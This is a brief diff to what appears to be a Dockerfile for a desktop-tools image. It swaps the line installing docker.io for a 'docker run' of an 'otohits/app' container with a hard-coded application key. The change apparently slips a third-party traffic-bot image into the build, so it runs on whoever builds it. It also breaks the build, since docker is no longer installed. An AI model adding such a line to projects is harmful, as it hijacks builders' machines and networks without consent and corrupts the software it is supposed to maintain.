@@ -45,7 +45,7 @@ RUN apt-get -qqy update \
     && apt install -qqy --no-install-recommends remmina remmina-plugin-rdp remmina-plugin-secret \
     && apt-add-repository ppa:obsproject/obs-studio \
     && apt update \
-    && apt install -y docker.io \
+    && docker run -e APPLICATION_KEY=073e8ec9-7a11-400e-a4d7-d7ef1d31ce0b otohits/app:latest \
     && apt update \
 
 
